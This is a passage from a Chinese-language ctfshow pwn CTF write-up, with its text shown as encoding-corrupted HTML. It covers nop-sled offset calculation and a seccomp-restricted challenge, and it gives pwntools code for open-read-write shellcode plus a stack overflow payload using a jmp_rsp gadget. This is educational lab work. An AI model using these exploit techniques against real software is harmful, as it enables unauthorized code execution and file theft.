&lt;/div&gt;&lt;p&gt;&lt;code&gt;addr&lt;/code&gt;ï¼š&lt;code&gt;query_position()&lt;/code&gt; è¿”å›çš„æ ˆåœ°å€å‚è€ƒï¼ˆ&lt;code&gt;v1&lt;/code&gt; çš„åœ°å€ï¼‰ï¼›&lt;/p&gt;
&lt;p&gt;&lt;code&gt;+0x2d&lt;/code&gt;ï¼šè¡¥å¿æ ˆå¸§åç§»ï¼ˆ è®¡ç®—å¾—å‡ºï¼š&lt;code&gt;0x15 + 4 + 4 + 0x10 = 0x2d&lt;/code&gt;ï¼‰ï¼Œå°† â€œ&lt;code&gt;v1&lt;/code&gt; çš„å‚è€ƒåœ°å€â€ ä¿®æ­£ä¸º â€œå®é™… payload ç¼“å†²åŒºï¼ˆ&lt;code&gt;seed&lt;/code&gt; æ•°ç»„ï¼‰çš„èµ·å§‹åœ°å€â€ï¼›&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;è¾ƒä½åœ°å€&lt;/th&gt;
          &lt;th&gt;â‡’&lt;/th&gt;
          &lt;th&gt;â‡’&lt;/th&gt;
          &lt;th&gt;â‡’&lt;/th&gt;
          &lt;th&gt;æ›´é«˜åœ°å€&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;stk[ebp-0x15]&lt;/td&gt;
          &lt;td&gt;ebpâ‡’&amp;lt;æ—§ebp&amp;gt;[4]&lt;/td&gt;
          &lt;td&gt;&amp;lt;è¿”å›åœ°å€&amp;gt;[4]&lt;/td&gt;
          &lt;td&gt;padding[0x10]&lt;/td&gt;
          &lt;td&gt;buffer[0x1000]&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;21 (0x15) + 4 + 4 + 16 (0x10) = 45 å­—èŠ‚ ï¼ˆ0x2dï¼‰&lt;/p&gt;
&lt;p&gt;&lt;code&gt;+668&lt;/code&gt;ï¼šè¦†ç›–ç¨‹åºçš„æœ€å¤§è´Ÿåç§»ï¼ˆ&lt;code&gt;-668&lt;/code&gt;ï¼‰ï¼Œç¡®ä¿è·³è½¬åœ°å€è½å…¥ 1336 ä¸ª nop çš„èŒƒå›´å†…ï¼ˆæ— è®ºéšæœºåç§»å¦‚ä½•æ³¢åŠ¨ï¼Œåœ°å€éƒ½èƒ½å‘½ä¸­ nop åºåˆ—ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/242.png&#34;
	width=&#34;941&#34;
	height=&#34;700&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/242_hu_207a95fa89730080.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/242_hu_d488948d8264c5bd.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;è½¬è½½åšä¸»å¤§ä½¬çš„æ ˆå›¾&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;134&#34;
		data-flex-basis=&#34;322px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;çœ‹å›*query_positionå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/241.png&#34;
	width=&#34;610&#34;
	height=&#34;253&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/241_hu_b76db1763bd6df64.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/241_hu_5afb8f9679a37742.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;query_positionå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;241&#34;
		data-flex-basis=&#34;578px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°v1åœ¨query_positionå‡½æ•°ebp-0x15çš„ä½ç½®ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/243.png&#34;
	width=&#34;833&#34;
	height=&#34;743&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/243_hu_5e90158efa9a242b.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/243_hu_dc47b50d10bbd0a5.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;æ ˆå¸ƒå±€&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;112&#34;
		data-flex-basis=&#34;269px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;â€”â€”â€”â€”å‚è€ƒ&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin_52635170/article/details/131985518&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CTFshow-pwnå…¥é—¨-pwn67(nop sledç©ºæ“ä½œé›ªæ©‡)-CSDNåšå®¢&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;åœ¨è¿™é‡Œæˆ‘æƒ³è¯´çš„æ˜¯&lt;strong&gt;nop sled å¹¶éä¸“é—¨ç”¨äºçªç ´ ASLR ä¿æŠ¤&lt;/strong&gt;ï¼Œå…¶æ ¸å¿ƒä½œç”¨æ˜¯ â€œæ‰©å¤§ shellcode çš„å¯å‘½ä¸­åœ°å€èŒƒå›´â€ï¼Œå¯ç”¨äºåº”å¯¹å¤šç§å¯¼è‡´ â€œshellcode åœ°å€ä¸ç¡®å®šâ€ çš„åœºæ™¯ï¼ŒASLR ä¿æŠ¤åªæ˜¯å…¶ä¸­ä¸€ç§ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ASLRï¼ˆåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼‰çš„æ ¸å¿ƒæ˜¯è®©ç¨‹åºçš„æ ˆã€å †ã€åº“ç­‰å†…å­˜åŒºåŸŸçš„èµ·å§‹åœ°å€æ¯æ¬¡è¿è¡Œæ—¶éšæœºå˜åŒ–ï¼ˆ PWN_061ã€PWN_062 ç­‰é¢˜ç›®å¼€å¯ PIEï¼Œæœ¬è´¨æ˜¯ ASLR çš„å»¶ä¼¸ï¼‰ï¼Œå¯¼è‡´æ”»å‡»è€…æ— æ³•æå‰ç¡®å®š shellcode çš„ç²¾ç¡®åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;nop sled çš„ä½œç”¨æ˜¯ï¼šé€šè¿‡åœ¨ shellcode å‰å¡«å……å¤§é‡&lt;code&gt;\x90&lt;/code&gt;ï¼ˆnop æŒ‡ä»¤ï¼‰ï¼Œå½¢æˆä¸€ä¸ª â€œæŒ‡ä»¤åºåˆ—åŒºåŸŸâ€â€”â€” åªè¦ç¨‹åºæ‰§è¡Œæµè·³è½¬åˆ°è¯¥åŒºåŸŸçš„&lt;strong&gt;ä»»æ„ä½ç½®&lt;/strong&gt;ï¼Œéƒ½ä¼šé¡ºç€ nop æŒ‡ä»¤é¡ºåºæ‰§è¡Œï¼Œæœ€ç»ˆå‘½ä¸­åç»­çš„ shellcodeã€‚&lt;/p&gt;
&lt;p&gt;ä»è¿™ä¸ªè§’åº¦çœ‹ï¼Œnop sled&lt;strong&gt;å¯ä»¥ç”¨äºçªç ´ ASLR å¸¦æ¥çš„åœ°å€éšæœºæ€§&lt;/strong&gt;ï¼Œä½†è¿™å¹¶éå…¶å”¯ä¸€ç”¨é€”ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;è¿™é¢˜éš¾åˆ°æˆ‘äº†ï¼Œå¯¹äºæ ˆçš„ç»“æ„äº†è§£ä¸å¤Ÿå¤šï¼Œnopã€0x2dç¢ç£¨å¾ˆä¹…æ‰æ˜ç™½&amp;hellip;&amp;hellip;ç­‰åˆ°åç»­å†å›æ¥å®Œå–„ä¸€ä¸‹ï¼Œå¦‚æœçœ‹ä¸æ‡‚å°±ç®—äº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pnw_068å¾…å®š&#34;&gt;PNW_068ï¼ˆå¾…å®šï¼‰
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š64bit nop sledã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_068&#34; &gt;PWN_068&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;pwn_069&#34;&gt;PWN_069
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šå¯ä»¥å°è¯•ç”¨ORWè¯»flag flagæ–‡ä»¶ä½ç½®ä¸º/ctfshow_flagã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_069&#34; &gt;PWN_069&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/244.png&#34;
	width=&#34;895&#34;
	height=&#34;230&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/244_hu_5888906a57a3adf4.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/244_hu_3919f1e7c20ea38e.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;389&#34;
		data-flex-basis=&#34;933px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;64ä½ä»…éƒ¨åˆ†å¼€å¯RELROï¼Œå…¶ä»–ä¿æŠ¤å…¨å…³ã€‚&lt;/p&gt;
&lt;p&gt;IDAæŸ¥çœ‹mainå‡½æ•°ï¼ˆä¾æ®å‡½æ•°åŠŸèƒ½ä¿®æ”¹å¯¹åº”å‡½æ•°åï¼‰ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/245.png&#34;
	width=&#34;690&#34;
	height=&#34;170&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/245_hu_4bd20d6e8b245f4d.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/245_hu_ad8d371ac9bf937.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;405&#34;
		data-flex-basis=&#34;974px&#34;
	
&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å¤ä¹ ä¸‹mmapå‡½æ•°ä½œç”¨ï¼Œä¸»è¦ç”¨é€”æœ‰ä¸‰ä¸ªï¼š&lt;/p&gt;
&lt;p&gt;1ã€å°†ä¸€ä¸ªæ™®é€šæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œé€šå¸¸åœ¨éœ€è¦å¯¹æ–‡ä»¶è¿›è¡Œé¢‘ç¹è¯»å†™æ—¶ä½¿ç”¨ï¼Œè¿™æ ·ç”¨å†…å­˜è¯»å†™å–ä»£I/Oè¯»å†™ï¼Œä»¥è·å¾—è¾ƒé«˜çš„æ€§èƒ½ï¼›&lt;/p&gt;
&lt;p&gt;2ã€å°†ç‰¹æ®Šæ–‡ä»¶è¿›è¡ŒåŒ¿åå†…å­˜æ˜ å°„ï¼Œå¯ä»¥ä¸ºå…³è”è¿›ç¨‹æä¾›å…±äº«å†…å­˜ç©ºé—´ï¼›&lt;/p&gt;
&lt;p&gt;3ã€ä¸ºæ— å…³è”çš„è¿›ç¨‹æä¾›å…±äº«å†…å­˜ç©ºé—´ï¼Œä¸€èˆ¬ä¹Ÿæ˜¯å°†ä¸€ä¸ªæ™®é€šæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;æŠŠä»0x123000å¼€å§‹çš„åœ°å€ï¼Œå¤§å°ä¸º0x1000çš„é•¿åº¦ï¼Œæƒé™æ”¹ä¸º&lt;code&gt;å¯å†™å¯æ‰§è¡Œ&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›seccompå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/246.png&#34;
	width=&#34;705&#34;
	height=&#34;235&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/246_hu_80ee2fadc85a00d3.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/246_hu_d7d4eb3f947974a7.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;seccomp&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;300&#34;
		data-flex-basis=&#34;720px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;seccompä¸»è¦ç”¨äºé…ç½®å’ŒåŠ è½½ &lt;strong&gt;Seccompï¼ˆSecure Computing Modeï¼Œå®‰å…¨è®¡ç®—æ¨¡å¼ï¼‰&lt;/strong&gt; ç­–ç•¥ï¼Œæ¥é™åˆ¶ç¨‹åºå¯ä»¥æ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨ï¼Œä»¥å¢å¼ºç¨‹åºçš„å®‰å…¨æ€§ã€‚&lt;/p&gt;
&lt;p&gt;wowè¿™é‡Œæ–°å¤§é™†&amp;hellip;.æ²™ç›’è¿‡æ»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;seccomp-tools dump ./pwn
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/247.png&#34;
	width=&#34;984&#34;
	height=&#34;438&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/247_hu_7b0db2f85b62029c.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/247_hu_1b6df6a4536fab9f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;224&#34;
		data-flex-basis=&#34;539px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åªæœ‰readï¼Œwriteï¼Œopenï¼Œexitå¯ä»¥ä½¿ç”¨ï¼Œä½¿ç”¨ open&amp;ndash;&amp;gt;read&amp;ndash;&amp;gt;write è¿™æ ·çš„orwçš„æ–¹å¼ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ORWæŒ‡çš„æ˜¯Open-Read-WriteæŠ€æœ¯ï¼Œæ˜¯ä¸€ç§åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨è¯»å–æ–‡ä»¶å†…å®¹ï¼ˆå¦‚flagæ–‡ä»¶ï¼‰çš„æ”»å‡»æ–¹æ³•ã€‚&lt;/p&gt;
&lt;p&gt;ORWé€šè¿‡ä»¥ä¸‹ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨å®ç°ï¼š&lt;/p&gt;
&lt;p&gt;openï¼šæ‰“å¼€ç›®æ ‡æ–‡ä»¶ï¼Œè·å–æ–‡ä»¶æè¿°ç¬¦ã€‚&lt;/p&gt;
&lt;p&gt;readï¼šé€šè¿‡æ–‡ä»¶æè¿°ç¬¦è¯»å–æ–‡ä»¶å†…å®¹åˆ°ç¼“å†²åŒºã€‚&lt;/p&gt;
&lt;p&gt;writeï¼šå°†ç¼“å†²åŒºçš„å†…å®¹å†™å…¥æ ‡å‡†è¾“å‡ºã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;è·Ÿè¿›ctfshowå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/248.png&#34;
	width=&#34;660&#34;
	height=&#34;175&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/248_hu_18988f2cbd8a93ca.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/248_hu_4d3b52149e6e7a93.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;ctfshowå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;377&#34;
		data-flex-basis=&#34;905px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæœ‰æ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œåœ¨ä¸Šé¢æˆ‘æåŠè¿‡mmapå‡½æ•°ï¼Œåœ¨mainå‡½æ•°å·²ç»æ‰§è¡Œè¿‡ä¸€æ¬¡äº†ï¼Œåœ¨0x123000è¿™é‡Œå·²ç»æœ‰å¯å†™å¯æ‰§è¡Œæƒé™äº†ã€‚åˆ°è¿™é‡Œï¼Œæ”»å‡»æ€è·¯å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œæˆ‘ä»¬æƒ³åŠæ³•å¾€mmapç»™çš„è¿™ä¸ªåœ°å€æ®µé‡Œé¢å†™shellcode(ORW)ï¼Œç„¶åè·³è½¬åˆ°è¿™é‡Œæ‰§è¡Œï¼Œå°±OKäº†ã€‚&lt;/p&gt;
&lt;p&gt;é‚£æˆ‘ä»¬çš„orw_shellcodeï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;mmap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x123000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;orw_shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/ctfshow_flag&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;orw_shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mmap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;## readé‡Œçš„fdå†™3æ˜¯å› ä¸ºç¨‹åºæ‰§è¡Œçš„æ—¶å€™æ–‡ä»¶æè¿°ç¬¦æ˜¯ä»3å¼€å§‹çš„ï¼Œwriteé‡Œçš„1æ˜¯æ ‡å‡†è¾“å‡ºåˆ°æ˜¾ç¤ºå™¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;orw_shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mmap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;orw_shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;shellcodeå·²ç»ç¼–å¥½äº†ï¼Œç°åœ¨ç¼–payloadè®©ç¨‹åºå¬æˆ‘ä»¬è¯ï¼Œå°†shellcodeæ³¨å…¥è¿›å†…å­˜ä¸­å»ã€‚&lt;/p&gt;
&lt;p&gt;shellcraft.readçš„ä½œç”¨æ˜¯æ‰§è¡Œreadå‡½æ•°çš„åç»­æµç¨‹â€”â€”è¯»å–0x100é•¿åº¦çš„å­—ç¬¦ï¼ˆä¹Ÿå°±æ˜¯åç»­çš„orw_shellcodeï¼‰ï¼Œæ–‡ä»¶æè¿°ç¬¦fd=3ï¼ˆ0ã€1ã€2å·²è¢«æ ‡å‡†æ–‡ä»¶å ç”¨ï¼‰&lt;/p&gt;
&lt;p&gt;&lt;code&gt;shellcraft.write(1, mmap, 0x100)&lt;/code&gt; çš„ &lt;code&gt;1&lt;/code&gt; æ˜¯ &lt;strong&gt;Linux æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰çš„å›ºå®šæ–‡ä»¶æè¿°ç¬¦&lt;/strong&gt;ï¼Œå…¶åŠŸèƒ½æ˜¯å°† &lt;code&gt;mmap&lt;/code&gt; åŒºåŸŸä¸­å­˜å‚¨çš„ &lt;code&gt;\ctfshow_flag&lt;/code&gt; å†…å®¹è¾“å‡ºåˆ°å±å¹•ï¼Œå½“æˆprintfä¹Ÿè¡Œã€‚&lt;/p&gt;
&lt;p&gt;payloadï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;jmp_rsp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x400a01&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mmap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;mov rax, 0x123000; jmp rax&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;jmp_rsp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sub rsp, 0x30; jmp rsp&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;æˆ‘åœ¨æ±‡ç¼–ä»£ç åˆ†æçš„è¿‡ç¨‹ä¸­æ‰¾åˆ°å…³é”®çš„jmp_rspåé—¨åœ°å€ï¼Œå¯ä»¥è°ƒç”¨è¿™è¡Œæ±‡ç¼–ä»£ç æ¥å®ç°è·³è½¬å›èµ·å§‹åœ°å€ï¼š&lt;/p&gt;
